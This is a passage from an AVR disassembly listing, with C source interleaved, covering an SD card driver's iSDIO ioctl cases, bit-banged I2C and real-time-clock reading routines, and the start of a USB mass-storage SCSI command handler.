    46d0:	ee 1a       	sub	r14, r30
    46d2:	f1 08       	sbc	r15, r1
    46d4:	f6 01       	movw	r30, r12
                {
                    xchg_spi(*bp++);
                }
                for (dc = 514 - sdi->ndata; dc; dc--)
    46d6:	e1 14       	cp	r14, r1
    46d8:	f1 04       	cpc	r15, r1
    46da:	99 f7       	brne	.-26     	; 0x46c2 <mmc_disk_ioctl+0x4e6>
    46dc:	d8 01       	movw	r26, r16
    46de:	11 96       	adiw	r26, 0x01	; 1
    46e0:	8d 91       	ld	r24, X+
    46e2:	9c 91       	ld	r25, X
    46e4:	12 97       	sbiw	r26, 0x02	; 2
    46e6:	02 e0       	ldi	r16, 0x02	; 2
    46e8:	12 e0       	ldi	r17, 0x02	; 2
                {
                    xchg_spi(0xFF);
    46ea:	08 1b       	sub	r16, r24
    46ec:	19 0b       	sbc	r17, r25
    46ee:	04 c0       	rjmp	.+8      	; 0x46f8 <mmc_disk_ioctl+0x51c>
                xchg_spi(0xFE);
                for (bp = sdi->data, dc = sdi->ndata; dc; dc--)
                {
                    xchg_spi(*bp++);
                }
                for (dc = 514 - sdi->ndata; dc; dc--)
    46f0:	8f ef       	ldi	r24, 0xFF	; 255
    46f2:	fa da       	rcall	.-2572   	; 0x3ce8 <xchg_spi>
    46f4:	01 50       	subi	r16, 0x01	; 1
    46f6:	11 09       	sbc	r17, r1
    46f8:	01 15       	cp	r16, r1
                {
                    xchg_spi(0xFF);
                }
                if ((xchg_spi(0xFF) & 0x1F) == 0x05)
    46fa:	11 05       	cpc	r17, r1
    46fc:	c9 f7       	brne	.-14     	; 0x46f0 <mmc_disk_ioctl+0x514>
    46fe:	8f ef       	ldi	r24, 0xFF	; 255
    4700:	f3 da       	rcall	.-2586   	; 0x3ce8 <xchg_spi>
    4702:	8f 71       	andi	r24, 0x1F	; 31
    4704:	85 30       	cpi	r24, 0x05	; 5
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    4706:	21 f0       	breq	.+8      	; 0x4710 <mmc_disk_ioctl+0x534>
    4708:	11 e0       	ldi	r17, 0x01	; 1
    470a:	03 c0       	rjmp	.+6      	; 0x4712 <mmc_disk_ioctl+0x536>
    470c:	11 e0       	ldi	r17, 0x01	; 1
                {
                    xchg_spi(0xFF);
                }
                if ((xchg_spi(0xFF) & 0x1F) == 0x05)
                {
                    res = RES_OK;
    470e:	01 c0       	rjmp	.+2      	; 0x4712 <mmc_disk_ioctl+0x536>
                }
            }
            deselect();
    4710:	10 e0       	ldi	r17, 0x00	; 0
    4712:	40 db       	rcall	.-2432   	; 0x3d94 <deselect>
            break;
    4714:	81 2f       	mov	r24, r17
    4716:	4e c0       	rjmp	.+156    	; 0x47b4 <mmc_disk_ioctl+0x5d8>

        case ISDIO_MRITE:
            sdi = buff;
            if (send_cmd(CMD49, 0x84000000 | (DWORD)sdi->func << 28 |
    4718:	fb 01       	movw	r30, r22
    471a:	40 81       	ld	r20, Z
    471c:	50 e0       	ldi	r21, 0x00	; 0
    471e:	60 e0       	ldi	r22, 0x00	; 0
    4720:	70 e0       	ldi	r23, 0x00	; 0
    4722:	03 2e       	mov	r0, r19
    4724:	3c e1       	ldi	r19, 0x1C	; 28
    4726:	44 0f       	add	r20, r20
    4728:	55 1f       	adc	r21, r21
    472a:	66 1f       	adc	r22, r22
    472c:	77 1f       	adc	r23, r23
                         (DWORD)sdi->addr << 9 | sdi->ndata >> 8) == 0)
    472e:	3a 95       	dec	r19
    4730:	d1 f7       	brne	.-12     	; 0x4726 <mmc_disk_ioctl+0x54a>
    4732:	30 2d       	mov	r19, r0
    4734:	83 81       	ldd	r24, Z+3	; 0x03
    4736:	94 81       	ldd	r25, Z+4	; 0x04
    4738:	a5 81       	ldd	r26, Z+5	; 0x05
    473a:	b6 81       	ldd	r27, Z+6	; 0x06
    473c:	07 2e       	mov	r0, r23
    473e:	79 e0       	ldi	r23, 0x09	; 9
    4740:	88 0f       	add	r24, r24
    4742:	99 1f       	adc	r25, r25
            deselect();
            break;

        case ISDIO_MRITE:
            sdi = buff;
            if (send_cmd(CMD49, 0x84000000 | (DWORD)sdi->func << 28 |
    4744:	aa 1f       	adc	r26, r26
    4746:	bb 1f       	adc	r27, r27
    4748:	7a 95       	dec	r23
    474a:	d1 f7       	brne	.-12     	; 0x4740 <mmc_disk_ioctl+0x564>
                         (DWORD)sdi->addr << 9 | sdi->ndata >> 8) == 0)
    474c:	70 2d       	mov	r23, r0
    474e:	48 2b       	or	r20, r24
    4750:	59 2b       	or	r21, r25
    4752:	6a 2b       	or	r22, r26
    4754:	7b 2b       	or	r23, r27
    4756:	82 81       	ldd	r24, Z+2	; 0x02
    4758:	90 e0       	ldi	r25, 0x00	; 0
            deselect();
            break;

        case ISDIO_MRITE:
            sdi = buff;
            if (send_cmd(CMD49, 0x84000000 | (DWORD)sdi->func << 28 |
    475a:	a0 e0       	ldi	r26, 0x00	; 0
    475c:	b0 e0       	ldi	r27, 0x00	; 0
    475e:	48 2b       	or	r20, r24
    4760:	59 2b       	or	r21, r25
    4762:	6a 2b       	or	r22, r26
    4764:	7b 2b       	or	r23, r27
                         (DWORD)sdi->addr << 9 | sdi->ndata >> 8) == 0)
            {
                xchg_spi(0xFF);
    4766:	74 68       	ori	r23, 0x84	; 132
    4768:	81 e3       	ldi	r24, 0x31	; 49
    476a:	79 db       	rcall	.-2318   	; 0x3e5e <send_cmd>
                xchg_spi(0xFE);
    476c:	81 11       	cpse	r24, r1
    476e:	19 c0       	rjmp	.+50     	; 0x47a2 <mmc_disk_ioctl+0x5c6>
    4770:	8f ef       	ldi	r24, 0xFF	; 255
                xchg_spi(sdi->ndata);
    4772:	ba da       	rcall	.-2700   	; 0x3ce8 <xchg_spi>
    4774:	8e ef       	ldi	r24, 0xFE	; 254
    4776:	b8 da       	rcall	.-2704   	; 0x3ce8 <xchg_spi>
    4778:	d8 01       	movw	r26, r16
    477a:	11 96       	adiw	r26, 0x01	; 1
                for (dc = 513; dc; dc--)
    477c:	8c 91       	ld	r24, X
    477e:	b4 da       	rcall	.-2712   	; 0x3ce8 <xchg_spi>
    4780:	01 e0       	ldi	r16, 0x01	; 1
                {
                    xchg_spi(0xFF);
    4782:	12 e0       	ldi	r17, 0x02	; 2
    4784:	04 c0       	rjmp	.+8      	; 0x478e <mmc_disk_ioctl+0x5b2>
    4786:	8f ef       	ldi	r24, 0xFF	; 255
                         (DWORD)sdi->addr << 9 | sdi->ndata >> 8) == 0)
            {
                xchg_spi(0xFF);
                xchg_spi(0xFE);
                xchg_spi(sdi->ndata);
                for (dc = 513; dc; dc--)
    4788:	af da       	rcall	.-2722   	; 0x3ce8 <xchg_spi>
    478a:	01 50       	subi	r16, 0x01	; 1
    478c:	11 09       	sbc	r17, r1
    478e:	01 15       	cp	r16, r1
    4790:	11 05       	cpc	r17, r1
                {
                    xchg_spi(0xFF);
                }
                if ((xchg_spi(0xFF) & 0x1F) == 0x05)
    4792:	c9 f7       	brne	.-14     	; 0x4786 <mmc_disk_ioctl+0x5aa>
    4794:	8f ef       	ldi	r24, 0xFF	; 255
    4796:	a8 da       	rcall	.-2736   	; 0x3ce8 <xchg_spi>
    4798:	8f 71       	andi	r24, 0x1F	; 31
    479a:	85 30       	cpi	r24, 0x05	; 5
    479c:	21 f0       	breq	.+8      	; 0x47a6 <mmc_disk_ioctl+0x5ca>
    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    }

    res = RES_ERROR;
    479e:	11 e0       	ldi	r17, 0x01	; 1
    47a0:	03 c0       	rjmp	.+6      	; 0x47a8 <mmc_disk_ioctl+0x5cc>
    47a2:	11 e0       	ldi	r17, 0x01	; 1
    47a4:	01 c0       	rjmp	.+2      	; 0x47a8 <mmc_disk_ioctl+0x5cc>
                {
                    xchg_spi(0xFF);
                }
                if ((xchg_spi(0xFF) & 0x1F) == 0x05)
                {
                    res = RES_OK;
    47a6:	10 e0       	ldi	r17, 0x00	; 0
                }
            }
            deselect();
    47a8:	f5 da       	rcall	.-2582   	; 0x3d94 <deselect>
    47aa:	81 2f       	mov	r24, r17
            break;
    47ac:	03 c0       	rjmp	.+6      	; 0x47b4 <mmc_disk_ioctl+0x5d8>
    47ae:	83 e0       	ldi	r24, 0x03	; 3
    UINT dc;
#endif

    if (Stat & STA_NOINIT)
    {
        return RES_NOTRDY;
    47b0:	01 c0       	rjmp	.+2      	; 0x47b4 <mmc_disk_ioctl+0x5d8>
    47b2:	84 e0       	ldi	r24, 0x04	; 4
            }
            deselect();
            break;
#endif
        default:
            res = RES_PARERR;
    47b4:	60 96       	adiw	r28, 0x10	; 16
    }

    return res;
}
    47b6:	0f b6       	in	r0, 0x3f	; 63
    47b8:	f8 94       	cli
    47ba:	de bf       	out	0x3e, r29	; 62
    47bc:	0f be       	out	0x3f, r0	; 63
    47be:	cd bf       	out	0x3d, r28	; 61
    47c0:	df 91       	pop	r29
    47c2:	cf 91       	pop	r28
    47c4:	1f 91       	pop	r17
    47c6:	0f 91       	pop	r16
    47c8:	ff 90       	pop	r15
    47ca:	ef 90       	pop	r14
    47cc:	df 90       	pop	r13
    47ce:	cf 90       	pop	r12
    47d0:	bf 90       	pop	r11
    47d2:	af 90       	pop	r10
    47d4:	08 95       	ret

000047d6 <mmc_disk_timerproc>:
    47d6:	80 91 60 09 	lds	r24, 0x0960	; 0x800960 <Timer1>
{
    BYTE n;
    //BYTE s;

    n = Timer1;             /* 100Hz decrement timer */
    if (n)
    47da:	88 23       	and	r24, r24
    47dc:	19 f0       	breq	.+6      	; 0x47e4 <mmc_disk_timerproc+0xe>
    {
        Timer1 = --n;
    47de:	81 50       	subi	r24, 0x01	; 1
    47e0:	80 93 60 09 	sts	0x0960, r24	; 0x800960 <Timer1>
    }
    n = Timer2;
    47e4:	80 91 5e 09 	lds	r24, 0x095E	; 0x80095e <Timer2>
    47e8:	90 91 5f 09 	lds	r25, 0x095F	; 0x80095f <Timer2+0x1>
    if (n)
    47ec:	88 23       	and	r24, r24
    47ee:	31 f0       	breq	.+12     	; 0x47fc <mmc_disk_timerproc+0x26>
    {
        Timer2 = --n;
    47f0:	81 50       	subi	r24, 0x01	; 1
    47f2:	90 e0       	ldi	r25, 0x00	; 0
    47f4:	90 93 5f 09 	sts	0x095F, r25	; 0x80095f <Timer2+0x1>
    47f8:	80 93 5e 09 	sts	0x095E, r24	; 0x80095e <Timer2>
    47fc:	08 95       	ret

000047fe <iic_delay>:
	}

	iic_stop();						/* Deselect device */

	return cnt ? 0 : 1;
}
    47fe:	84 e0       	ldi	r24, 0x04	; 4
    4800:	90 e0       	ldi	r25, 0x00	; 0
    4802:	02 c0       	rjmp	.+4      	; 0x4808 <iic_delay+0xa>
    4804:	23 b1       	in	r18, 0x03	; 3
    4806:	01 97       	sbiw	r24, 0x01	; 1
    4808:	00 97       	sbiw	r24, 0x00	; 0
    480a:	e1 f7       	brne	.-8      	; 0x4804 <iic_delay+0x6>
    480c:	08 95       	ret

0000480e <iic_start>:
    480e:	84 b1       	in	r24, 0x04	; 4
    4810:	8e 7f       	andi	r24, 0xFE	; 254
    4812:	84 b9       	out	0x04, r24	; 4
    4814:	f4 df       	rcall	.-24     	; 0x47fe <iic_delay>
    4816:	84 b1       	in	r24, 0x04	; 4
    4818:	8d 7f       	andi	r24, 0xFD	; 253
    481a:	84 b9       	out	0x04, r24	; 4
    481c:	f0 df       	rcall	.-32     	; 0x47fe <iic_delay>
    481e:	84 b1       	in	r24, 0x04	; 4
    4820:	81 60       	ori	r24, 0x01	; 1
    4822:	84 b9       	out	0x04, r24	; 4
    4824:	ec df       	rcall	.-40     	; 0x47fe <iic_delay>
    4826:	84 b1       	in	r24, 0x04	; 4
    4828:	82 60       	ori	r24, 0x02	; 2
    482a:	84 b9       	out	0x04, r24	; 4
    482c:	e8 cf       	rjmp	.-48     	; 0x47fe <iic_delay>
    482e:	08 95       	ret

00004830 <iic_stop>:
    4830:	84 b1       	in	r24, 0x04	; 4
    4832:	81 60       	ori	r24, 0x01	; 1
    4834:	84 b9       	out	0x04, r24	; 4
    4836:	e3 df       	rcall	.-58     	; 0x47fe <iic_delay>
    4838:	84 b1       	in	r24, 0x04	; 4
    483a:	8d 7f       	andi	r24, 0xFD	; 253
    483c:	84 b9       	out	0x04, r24	; 4
    483e:	df df       	rcall	.-66     	; 0x47fe <iic_delay>
    4840:	84 b1       	in	r24, 0x04	; 4
    4842:	8e 7f       	andi	r24, 0xFE	; 254
    4844:	84 b9       	out	0x04, r24	; 4
    4846:	db cf       	rjmp	.-74     	; 0x47fe <iic_delay>
    4848:	08 95       	ret

0000484a <iic_send>:
    484a:	cf 93       	push	r28
    484c:	df 93       	push	r29
    484e:	d8 2f       	mov	r29, r24
    4850:	c0 e8       	ldi	r28, 0x80	; 128
    4852:	8c 2f       	mov	r24, r28
    4854:	8d 23       	and	r24, r29
    4856:	21 f0       	breq	.+8      	; 0x4860 <iic_send+0x16>
    4858:	84 b1       	in	r24, 0x04	; 4
    485a:	8e 7f       	andi	r24, 0xFE	; 254
    485c:	84 b9       	out	0x04, r24	; 4
    485e:	03 c0       	rjmp	.+6      	; 0x4866 <iic_send+0x1c>
    4860:	84 b1       	in	r24, 0x04	; 4
    4862:	81 60       	ori	r24, 0x01	; 1
    4864:	84 b9       	out	0x04, r24	; 4
    4866:	cb df       	rcall	.-106    	; 0x47fe <iic_delay>
    4868:	84 b1       	in	r24, 0x04	; 4
    486a:	8d 7f       	andi	r24, 0xFD	; 253
    486c:	84 b9       	out	0x04, r24	; 4
    486e:	c7 df       	rcall	.-114    	; 0x47fe <iic_delay>
    4870:	84 b1       	in	r24, 0x04	; 4
    4872:	82 60       	ori	r24, 0x02	; 2
    4874:	84 b9       	out	0x04, r24	; 4
    4876:	c3 df       	rcall	.-122    	; 0x47fe <iic_delay>
    4878:	c6 95       	lsr	r28
    487a:	59 f7       	brne	.-42     	; 0x4852 <iic_send+0x8>
    487c:	84 b1       	in	r24, 0x04	; 4
    487e:	8e 7f       	andi	r24, 0xFE	; 254
    4880:	84 b9       	out	0x04, r24	; 4
    4882:	bd df       	rcall	.-134    	; 0x47fe <iic_delay>
    4884:	84 b1       	in	r24, 0x04	; 4
    4886:	8d 7f       	andi	r24, 0xFD	; 253
    4888:	84 b9       	out	0x04, r24	; 4
    488a:	c3 b1       	in	r28, 0x03	; 3
    488c:	81 e0       	ldi	r24, 0x01	; 1
    488e:	c8 27       	eor	r28, r24
    4890:	c1 70       	andi	r28, 0x01	; 1
    4892:	b5 df       	rcall	.-150    	; 0x47fe <iic_delay>
    4894:	84 b1       	in	r24, 0x04	; 4
    4896:	82 60       	ori	r24, 0x02	; 2
    4898:	84 b9       	out	0x04, r24	; 4
    489a:	b1 df       	rcall	.-158    	; 0x47fe <iic_delay>
    489c:	8c 2f       	mov	r24, r28
    489e:	90 e0       	ldi	r25, 0x00	; 0
    48a0:	df 91       	pop	r29
    48a2:	cf 91       	pop	r28
    48a4:	08 95       	ret

000048a6 <iic_rcvr>:
    48a6:	0f 93       	push	r16
    48a8:	1f 93       	push	r17
    48aa:	cf 93       	push	r28
    48ac:	df 93       	push	r29
    48ae:	8c 01       	movw	r16, r24
    48b0:	c1 e0       	ldi	r28, 0x01	; 1
    48b2:	d0 e0       	ldi	r29, 0x00	; 0
    48b4:	cc 0f       	add	r28, r28
    48b6:	dd 1f       	adc	r29, r29
    48b8:	84 b1       	in	r24, 0x04	; 4
    48ba:	8d 7f       	andi	r24, 0xFD	; 253
    48bc:	84 b9       	out	0x04, r24	; 4
    48be:	18 99       	sbic	0x03, 0	; 3
    48c0:	21 96       	adiw	r28, 0x01	; 1
    48c2:	9d df       	rcall	.-198    	; 0x47fe <iic_delay>
    48c4:	84 b1       	in	r24, 0x04	; 4
    48c6:	82 60       	ori	r24, 0x02	; 2
    48c8:	84 b9       	out	0x04, r24	; 4
    48ca:	99 df       	rcall	.-206    	; 0x47fe <iic_delay>
    48cc:	cf 3f       	cpi	r28, 0xFF	; 255
    48ce:	d1 05       	cpc	r29, r1
    48d0:	89 f3       	breq	.-30     	; 0x48b4 <iic_rcvr+0xe>
    48d2:	80 f3       	brcs	.-32     	; 0x48b4 <iic_rcvr+0xe>
    48d4:	01 2b       	or	r16, r17
    48d6:	21 f0       	breq	.+8      	; 0x48e0 <iic_rcvr+0x3a>
    48d8:	84 b1       	in	r24, 0x04	; 4
    48da:	81 60       	ori	r24, 0x01	; 1
    48dc:	84 b9       	out	0x04, r24	; 4
    48de:	03 c0       	rjmp	.+6      	; 0x48e6 <iic_rcvr+0x40>
    48e0:	84 b1       	in	r24, 0x04	; 4
    48e2:	8e 7f       	andi	r24, 0xFE	; 254
    48e4:	84 b9       	out	0x04, r24	; 4
    48e6:	8b df       	rcall	.-234    	; 0x47fe <iic_delay>
    48e8:	84 b1       	in	r24, 0x04	; 4
    48ea:	8d 7f       	andi	r24, 0xFD	; 253
    48ec:	84 b9       	out	0x04, r24	; 4
    48ee:	87 df       	rcall	.-242    	; 0x47fe <iic_delay>
    48f0:	84 b1       	in	r24, 0x04	; 4
    48f2:	82 60       	ori	r24, 0x02	; 2
    48f4:	84 b9       	out	0x04, r24	; 4
    48f6:	84 b1       	in	r24, 0x04	; 4
    48f8:	8e 7f       	andi	r24, 0xFE	; 254
    48fa:	84 b9       	out	0x04, r24	; 4
    48fc:	80 df       	rcall	.-256    	; 0x47fe <iic_delay>
    48fe:	8c 2f       	mov	r24, r28
    4900:	df 91       	pop	r29
    4902:	cf 91       	pop	r28
    4904:	1f 91       	pop	r17
    4906:	0f 91       	pop	r16
    4908:	08 95       	ret

0000490a <iic_read>:
    490a:	cf 92       	push	r12
    490c:	df 92       	push	r13
    490e:	ef 92       	push	r14
    4910:	ff 92       	push	r15
    4912:	0f 93       	push	r16
    4914:	1f 93       	push	r17
    4916:	cf 93       	push	r28
    4918:	df 93       	push	r29
    491a:	18 2f       	mov	r17, r24
    491c:	06 2f       	mov	r16, r22
    491e:	7a 01       	movw	r14, r20
    4920:	69 01       	movw	r12, r18
    4922:	45 2b       	or	r20, r21
    4924:	79 f1       	breq	.+94     	; 0x4984 <iic_read+0x7a>
    4926:	ca e0       	ldi	r28, 0x0A	; 10
    4928:	d0 e0       	ldi	r29, 0x00	; 0
    492a:	71 df       	rcall	.-286    	; 0x480e <iic_start>
    492c:	81 2f       	mov	r24, r17
    492e:	8d df       	rcall	.-230    	; 0x484a <iic_send>
    4930:	89 2b       	or	r24, r25
    4932:	11 f4       	brne	.+4      	; 0x4938 <iic_read+0x2e>
    4934:	21 97       	sbiw	r28, 0x01	; 1
    4936:	c9 f7       	brne	.-14     	; 0x492a <iic_read+0x20>
    4938:	cd 2b       	or	r28, r29
    493a:	e9 f0       	breq	.+58     	; 0x4976 <iic_read+0x6c>
    493c:	80 2f       	mov	r24, r16
    493e:	85 df       	rcall	.-246    	; 0x484a <iic_send>
    4940:	89 2b       	or	r24, r25
    4942:	c9 f0       	breq	.+50     	; 0x4976 <iic_read+0x6c>
    4944:	64 df       	rcall	.-312    	; 0x480e <iic_start>
    4946:	81 2f       	mov	r24, r17
    4948:	81 60       	ori	r24, 0x01	; 1
    494a:	7f df       	rcall	.-258    	; 0x484a <iic_send>
    494c:	89 2b       	or	r24, r25
    494e:	99 f0       	breq	.+38     	; 0x4976 <iic_read+0x6c>
    4950:	81 e0       	ldi	r24, 0x01	; 1
    4952:	e8 1a       	sub	r14, r24
    4954:	f1 08       	sbc	r15, r1
    4956:	e6 01       	movw	r28, r12
    4958:	21 96       	adiw	r28, 0x01	; 1
    495a:	81 e0       	ldi	r24, 0x01	; 1
    495c:	90 e0       	ldi	r25, 0x00	; 0
    495e:	e1 14       	cp	r14, r1
    4960:	f1 04       	cpc	r15, r1
    4962:	11 f4       	brne	.+4      	; 0x4968 <iic_read+0x5e>
    4964:	80 e0       	ldi	r24, 0x00	; 0
    4966:	90 e0       	ldi	r25, 0x00	; 0
    4968:	9e df       	rcall	.-196    	; 0x48a6 <iic_rcvr>
    496a:	f6 01       	movw	r30, r12
    496c:	80 83       	st	Z, r24
    496e:	6e 01       	movw	r12, r28
    4970:	e1 14       	cp	r14, r1
    4972:	f1 04       	cpc	r15, r1
    4974:	69 f7       	brne	.-38     	; 0x4950 <iic_read+0x46>
    4976:	5c df       	rcall	.-328    	; 0x4830 <iic_stop>
    4978:	81 e0       	ldi	r24, 0x01	; 1
    497a:	ef 28       	or	r14, r15
    497c:	09 f0       	breq	.+2      	; 0x4980 <iic_read+0x76>
    497e:	80 e0       	ldi	r24, 0x00	; 0
    4980:	90 e0       	ldi	r25, 0x00	; 0
    4982:	02 c0       	rjmp	.+4      	; 0x4988 <iic_read+0x7e>
    4984:	80 e0       	ldi	r24, 0x00	; 0
    4986:	90 e0       	ldi	r25, 0x00	; 0
    4988:	df 91       	pop	r29
    498a:	cf 91       	pop	r28
    498c:	1f 91       	pop	r17
    498e:	0f 91       	pop	r16
    4990:	ff 90       	pop	r15
    4992:	ef 90       	pop	r14
    4994:	df 90       	pop	r13
    4996:	cf 90       	pop	r12
    4998:	08 95       	ret

0000499a <rtc_gettime>:
/*-------------------------------------------------*/
/* RTC functions                                   */


int rtc_gettime (RTC *rtc)
{
    499a:	0f 93       	push	r16
    499c:	1f 93       	push	r17
    499e:	cf 93       	push	r28
    49a0:	df 93       	push	r29
    49a2:	cd b7       	in	r28, 0x3d	; 61
    49a4:	de b7       	in	r29, 0x3e	; 62
    49a6:	28 97       	sbiw	r28, 0x08	; 8
    49a8:	0f b6       	in	r0, 0x3f	; 63
    49aa:	f8 94       	cli
    49ac:	de bf       	out	0x3e, r29	; 62
    49ae:	0f be       	out	0x3f, r0	; 63
    49b0:	cd bf       	out	0x3d, r28	; 61
    49b2:	8c 01       	movw	r16, r24
	uint8_t buf[8];


	if (!iic_read(0xD0, 0, 7, buf)) return 0;
    49b4:	9e 01       	movw	r18, r28
    49b6:	2f 5f       	subi	r18, 0xFF	; 255
    49b8:	3f 4f       	sbci	r19, 0xFF	; 255
    49ba:	47 e0       	ldi	r20, 0x07	; 7
    49bc:	50 e0       	ldi	r21, 0x00	; 0
    49be:	60 e0       	ldi	r22, 0x00	; 0
    49c0:	70 e0       	ldi	r23, 0x00	; 0
    49c2:	80 ed       	ldi	r24, 0xD0	; 208
    49c4:	a2 df       	rcall	.-188    	; 0x490a <iic_read>
    49c6:	00 97       	sbiw	r24, 0x00	; 0
    49c8:	09 f4       	brne	.+2      	; 0x49cc <rtc_gettime+0x32>
    49ca:	60 c0       	rjmp	.+192    	; 0x4a8c <rtc_gettime+0xf2>

	rtc->sec = (buf[0] & 0x0F) + ((buf[0] >> 4) & 7) * 10;
    49cc:	89 81       	ldd	r24, Y+1	; 0x01
    49ce:	98 2f       	mov	r25, r24
    49d0:	92 95       	swap	r25
    49d2:	9f 70       	andi	r25, 0x0F	; 15
    49d4:	97 70       	andi	r25, 0x07	; 7
    49d6:	99 0f       	add	r25, r25
    49d8:	29 2f       	mov	r18, r25
    49da:	22 0f       	add	r18, r18
    49dc:	22 0f       	add	r18, r18
    49de:	92 0f       	add	r25, r18
    49e0:	8f 70       	andi	r24, 0x0F	; 15
    49e2:	89 0f       	add	r24, r25
    49e4:	f8 01       	movw	r30, r16
    49e6:	87 83       	std	Z+7, r24	; 0x07
	rtc->min = (buf[1] & 0x0F) + (buf[1] >> 4) * 10;
    49e8:	8a 81       	ldd	r24, Y+2	; 0x02
    49ea:	98 2f       	mov	r25, r24
    49ec:	92 95       	swap	r25
    49ee:	9f 70       	andi	r25, 0x0F	; 15
    49f0:	99 0f       	add	r25, r25
    49f2:	29 2f       	mov	r18, r25
    49f4:	22 0f       	add	r18, r18
    49f6:	22 0f       	add	r18, r18
    49f8:	92 0f       	add	r25, r18
    49fa:	8f 70       	andi	r24, 0x0F	; 15
    49fc:	89 0f       	add	r24, r25
    49fe:	86 83       	std	Z+6, r24	; 0x06
	rtc->hour = (buf[2] & 0x0F) + ((buf[2] >> 4) & 3) * 10;
    4a00:	9b 81       	ldd	r25, Y+3	; 0x03
    4a02:	89 2f       	mov	r24, r25
    4a04:	82 95       	swap	r24
    4a06:	8f 70       	andi	r24, 0x0F	; 15
    4a08:	83 70       	andi	r24, 0x03	; 3
    4a0a:	88 0f       	add	r24, r24
    4a0c:	28 2f       	mov	r18, r24
    4a0e:	22 0f       	add	r18, r18
    4a10:	22 0f       	add	r18, r18
    4a12:	82 0f       	add	r24, r18
    4a14:	29 2f       	mov	r18, r25
    4a16:	2f 70       	andi	r18, 0x0F	; 15
    4a18:	82 0f       	add	r24, r18
    4a1a:	85 83       	std	Z+5, r24	; 0x05
	rtc->wday = (buf[2] & 0x07);
    4a1c:	97 70       	andi	r25, 0x07	; 7
    4a1e:	94 83       	std	Z+4, r25	; 0x04
	rtc->mday = (buf[4] & 0x0F) + ((buf[4] >> 4) & 3) * 10;
    4a20:	8d 81       	ldd	r24, Y+5	; 0x05
    4a22:	98 2f       	mov	r25, r24
    4a24:	92 95       	swap	r25
    4a26:	9f 70       	andi	r25, 0x0F	; 15
    4a28:	93 70       	andi	r25, 0x03	; 3
    4a2a:	99 0f       	add	r25, r25
    4a2c:	29 2f       	mov	r18, r25
    4a2e:	22 0f       	add	r18, r18
    4a30:	22 0f       	add	r18, r18
    4a32:	92 0f       	add	r25, r18
    4a34:	8f 70       	andi	r24, 0x0F	; 15
    4a36:	89 0f       	add	r24, r25
    4a38:	83 83       	std	Z+3, r24	; 0x03
	rtc->month = (buf[5] & 0x0F) + ((buf[5] >> 4) & 1) * 10;
    4a3a:	8e 81       	ldd	r24, Y+6	; 0x06
    4a3c:	84 fb       	bst	r24, 4
    4a3e:	99 27       	eor	r25, r25
    4a40:	90 f9       	bld	r25, 0
    4a42:	99 0f       	add	r25, r25
    4a44:	29 2f       	mov	r18, r25
    4a46:	22 0f       	add	r18, r18
    4a48:	22 0f       	add	r18, r18
    4a4a:	92 0f       	add	r25, r18
    4a4c:	8f 70       	andi	r24, 0x0F	; 15
    4a4e:	89 0f       	add	r24, r25
    4a50:	82 83       	std	Z+2, r24	; 0x02
	rtc->year = 2000 + (buf[6] & 0x0F) + (buf[6] >> 4) * 10;
    4a52:	9f 81       	ldd	r25, Y+7	; 0x07
    4a54:	49 2f       	mov	r20, r25
    4a56:	4f 70       	andi	r20, 0x0F	; 15
    4a58:	50 e0       	ldi	r21, 0x00	; 0
    4a5a:	40 53       	subi	r20, 0x30	; 48
    4a5c:	58 4f       	sbci	r21, 0xF8	; 248
    4a5e:	92 95       	swap	r25
    4a60:	9f 70       	andi	r25, 0x0F	; 15
    4a62:	89 2f       	mov	r24, r25
    4a64:	90 e0       	ldi	r25, 0x00	; 0
    4a66:	bc 01       	movw	r22, r24
    4a68:	66 0f       	add	r22, r22
    4a6a:	77 1f       	adc	r23, r23
    4a6c:	9c 01       	movw	r18, r24
    4a6e:	22 0f       	add	r18, r18
    4a70:	33 1f       	adc	r19, r19
    4a72:	22 0f       	add	r18, r18
    4a74:	33 1f       	adc	r19, r19
    4a76:	22 0f       	add	r18, r18
    4a78:	33 1f       	adc	r19, r19
    4a7a:	cb 01       	movw	r24, r22
    4a7c:	82 0f       	add	r24, r18
    4a7e:	93 1f       	adc	r25, r19
    4a80:	84 0f       	add	r24, r20
    4a82:	95 1f       	adc	r25, r21
    4a84:	91 83       	std	Z+1, r25	; 0x01
    4a86:	80 83       	st	Z, r24

	return 1;
    4a88:	81 e0       	ldi	r24, 0x01	; 1
    4a8a:	90 e0       	ldi	r25, 0x00	; 0
}
    4a8c:	28 96       	adiw	r28, 0x08	; 8
    4a8e:	0f b6       	in	r0, 0x3f	; 63
    4a90:	f8 94       	cli
    4a92:	de bf       	out	0x3e, r29	; 62
    4a94:	0f be       	out	0x3f, r0	; 63
    4a96:	cd bf       	out	0x3d, r28	; 61
    4a98:	df 91       	pop	r29
    4a9a:	cf 91       	pop	r28
    4a9c:	1f 91       	pop	r17
    4a9e:	0f 91       	pop	r16
    4aa0:	08 95       	ret

00004aa2 <SCSI_Command_ModeSense_6>:
 *
 *  \return Boolean \c true if the command completed successfully, \c false otherwise.
 */
static bool SCSI_Command_ModeSense_6(USB_ClassInfo_MS_Device_t* const
                                     MSInterfaceInfo)
{
    4aa2:	dc 01       	movw	r26, r24
			 *  \param[in] Data  Data to write into the the currently selected endpoint's FIFO buffer.
			 */
			static inline void Endpoint_Write_8(const uint8_t Data) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_Write_8(const uint8_t Data)
			{
				UEDATX = Data;
    4aa4:	e1 ef       	ldi	r30, 0xF1	; 241
    4aa6:	f0 e0       	ldi	r31, 0x00	; 0
    4aa8:	10 82       	st	Z, r1
    4aaa:	10 82       	st	Z, r1
    4aac:	10 82       	st	Z, r1
    4aae:	10 82       	st	Z, r1
			 */
			static inline void Endpoint_ClearIN(void) ATTR_ALWAYS_INLINE;
			static inline void Endpoint_ClearIN(void)
			{
				#if !defined(CONTROL_ONLY_DEVICE)
					UEINTX &= ~((1 << TXINI) | (1 << FIFOCON));
    4ab0:	e8 ee       	ldi	r30, 0xE8	; 232
    4ab2:	f0 e0       	ldi	r31, 0x00	; 0
    4ab4:	90 81       	ld	r25, Z
    4ab6:	9e 77       	andi	r25, 0x7E	; 126
    4ab8:	90 83       	st	Z, r25
    Endpoint_Write_8(DISK_READ_ONLY ? 0x80 : 0x00);
    Endpoint_Write_8(0x00);
    Endpoint_ClearIN();

    /* Update the bytes transferred counter and succeed the command */
    MSInterfaceInfo->State.CommandBlock.DataTransferLength -= 4;
    4aba:	54 96       	adiw	r26, 0x14	; 20
    4abc:	4d 91       	ld	r20, X+
    4abe:	5d 91       	ld	r21, X+
